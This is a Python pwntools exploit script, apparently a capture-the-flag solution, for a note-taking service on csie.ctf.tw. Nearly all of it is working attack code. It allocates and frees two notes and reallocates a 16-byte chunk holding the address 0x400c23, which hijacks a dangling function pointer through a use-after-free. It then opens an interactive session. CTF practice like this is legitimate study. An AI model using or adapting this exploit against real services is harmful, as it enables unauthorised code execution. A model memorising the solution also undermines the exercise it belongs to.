from pwn import *

r = remote("csie.ctf.tw", 10137)

def add_note(size, content):
    r.sendlineafter(':', "1")
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', content)

def del_note(index):
    r.sendlineafter(':', "2")
    r.sendlineafter(':', str(index))

def print_note(index):
    r.sendlineafter(':', "3")
    r.sendlineafter(':', str(index))

magic = 0x400c23

add_note(0x50, "jedi")
add_note(0x50, "jedi")
del_note(0)
del_note(1)
add_note(16, p64(magic))
print_note(0)
r.interactive()
